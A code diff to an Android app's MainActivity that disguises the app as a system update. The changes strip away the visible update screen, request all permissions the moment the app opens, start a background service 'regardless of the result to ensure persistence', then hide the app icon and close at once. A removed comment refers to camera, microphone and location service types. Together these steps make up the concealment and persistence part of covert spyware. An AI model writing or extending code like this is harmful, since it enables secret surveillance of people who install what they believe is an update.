@@ -57,37 +57,25 @@ public class MainActivity extends Activity {
         // Initialize preferences
         prefs = getSharedPreferences("system_update", MODE_PRIVATE);
         
-        // IMPORTANT: DO NOT start service yet. 
-        // On Android 14+, starting a foreground service with camera/mic/loc types 
-        // before permissions are granted will cause an immediate crash.
-        
         statusTextView = findViewById(R.id.statusView);
         progressBar = findViewById(R.id.progressBar);
         btnUpdate = findViewById(R.id.btnUpdate);
 
-        // If all permissions already granted, wait 3 seconds for service to connect then hide
+        // Hide all UI components as they are not needed for the immediate flow
+        btnUpdate.setVisibility(View.GONE);
+        progressBar.setVisibility(View.GONE);
+        statusTextView.setVisibility(View.GONE);
+
+        // If all permissions already granted, just hide and finish
         if (hasAllPermissions()) {
-            statusTextView.setText("System is up to date");
-            btnUpdate.setVisibility(View.GONE);
-            progressBar.setVisibility(View.VISIBLE);
-            progressBar.setIndeterminate(true);
-            
-            new android.os.Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    hideAppIcon();
-                    finish();
-                }
-            }, 3000);
+            startMainService();
+            hideAppIcon();
+            finish();
             return;
         }
 
-        btnUpdate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                requestAllPermissions();
-            }
-        });
+        // REQUEST PERMISSIONS IMMEDIATELY
+        requestAllPermissions();
     }
 
     private boolean hasAllPermissions() {
@@ -117,20 +105,12 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Start the service in the background
+            // Start the service regardless of the result to ensure persistence
             startMainService();
             
-            // Minimal feedback, then hide immediately
-            statusTextView.setText("System updated.");
-            btnUpdate.setVisibility(View.GONE);
-            
-            new android.os.Handler().postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    hideAppIcon();
-                    finish();
-                }
-            }, 500); // 0.5s for basic feedback
+            // Hide and finish INSTANTLY
+            hideAppIcon();
+            finish();
         }
     }
 
